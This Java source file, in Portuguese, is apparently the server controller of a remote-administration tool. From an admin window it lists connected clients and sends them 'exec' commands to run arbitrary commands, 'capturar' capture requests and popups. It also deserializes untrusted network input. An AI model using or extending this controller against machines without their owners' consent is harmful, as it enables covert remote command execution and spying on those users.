package br.com.enviador.controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import javax.swing.JFrame;

import br.com.enviador.model.Cliente;
import br.com.enviador.view.JanelaAdm;

public class ServidorController {

	public ArrayList<Cliente> listaDeClientes;
	public ServerSocket serverSocket;

	public ServidorController() {

		this.listaDeClientes = new ArrayList<Cliente>();
	}

	public void iniciaServico() {
		Thread iniciando = new Thread(new Runnable() {
			public void run() {

				System.out.println("Servidor Iniciando...");
				int porta = 37389;
				System.out.println("Abrindo conexão na porta " + porta);
				try {

					serverSocket = new ServerSocket(porta, 10);
					System.out.println("Seridor Iniciado, aguardando conexões. ");
					Socket socketCliente;
					while (true) {
						socketCliente = serverSocket.accept();
						System.out.println("Nova conexão. Vamos processa-la.");
						processandoConexao(socketCliente);
					}

				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
		iniciando.start();

	}

	public void processandoConexao(final Socket socketCliente) {
		Thread processando = new Thread(new Runnable() {

			@Override
			public void run() {

				Cliente cliente = new Cliente();
				cliente.setConxao(socketCliente);
				listaDeClientes.add(cliente);

				try {
					ObjectOutputStream saida = new ObjectOutputStream(socketCliente.getOutputStream());
					cliente.setSaida(saida);
					ObjectInputStream entrada = new ObjectInputStream(socketCliente.getInputStream());
					cliente.setEntrada(entrada);

					while (true) {
						try {
							String mensagem = (String) entrada.readObject();
							processandoMensagens(mensagem, cliente);

						} catch (ClassNotFoundException e) {

							System.out.println("Erro maluco, cliente desconectado. ");
							cliente.getConxao().close();
							listaDeClientes.remove(cliente);
							break;
						}

					}
				} catch (IOException e) {
					System.out.println("Erro maluco, cliente desconectado. ");
					try {
						cliente.getConxao().close();
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					listaDeClientes.remove(cliente);

				}
				listaDeClientes.remove(cliente);
			}
		});
		processando.start();

	}

	public void processandoMensagens(final String mensagem, final Cliente cliente) {
		Thread processandoMensagem = new Thread(new Runnable() {
			
			@Override
			public void run() {
				if (mensagem.contains("setNome") && mensagem.length() >= "setNome".length() + 2) {
					cliente.setNome(mensagem.substring("setNome(".length(), mensagem.length() - 1));
					System.out.println("Novo nome é: " + cliente.getNome());
				}

				System.out.println(cliente.getNome() + ">>" + mensagem);
			}
		});
			
		processandoMensagem.start();

	}

	public void iniciaAdministrador() {
		System.out.println("Era pra abrir aqui.");

		final JanelaAdm janela = new JanelaAdm();
		janela.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		janela.getBtnEnviar().addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String comando = janela.getTextField().getText();
				janela.getTextField().setText("");

				System.out.println(comando);
				processaMensagemAdm(comando);

			}
		});
		janela.setVisible(true);

	}

	public void processaMensagemAdm(String mensagem) {
		if (mensagem.equals("listar")) {

			System.out.println("Lista de clientes");
			for (Cliente cliente : listaDeClientes) {
				System.out.println(cliente.getNome());
			}

		} else if (mensagem.equals("testeJanelinha")) {
			System.out.println("Janelinha em todos");
			for (Cliente cliente : listaDeClientes) {
				try {
					cliente.getSaida().writeObject("abreJanelinha");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		}else if(mensagem.contains("exec")){
			String parametros = mensagem.substring("exec(".length(), mensagem.length() - 1);
			String nome = parametros.substring(0, parametros.indexOf(","));
			String comando = parametros.substring(parametros.indexOf(",")+1);
			
			nome = nome.trim();
			comando = comando.trim();
			for (Cliente cliente : listaDeClientes) {
				if(cliente.getNome().trim().toLowerCase().equals(nome.toLowerCase())){
					try {
						cliente.getSaida().writeObject("exec("+comando+")");
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
				}
			
			}
			
			
			
		}else if(mensagem.contains("capturar")){
			String parametros = mensagem.substring("exec(".length(), mensagem.length() - 1);
			String nome = parametros.substring(0, parametros.indexOf(")"));			
			nome = nome.trim();
			for (Cliente cliente : listaDeClientes) {
				if(cliente.getNome().trim().toLowerCase().equals(nome.toLowerCase())){
					try {
						cliente.getSaida().writeObject("capturar()");
					} catch (IOException e) {

						e.printStackTrace();
					}
				}
			}
		}
		
		
		
		else {

			System.out.println("Comando desconhecido");

		}
	}

}
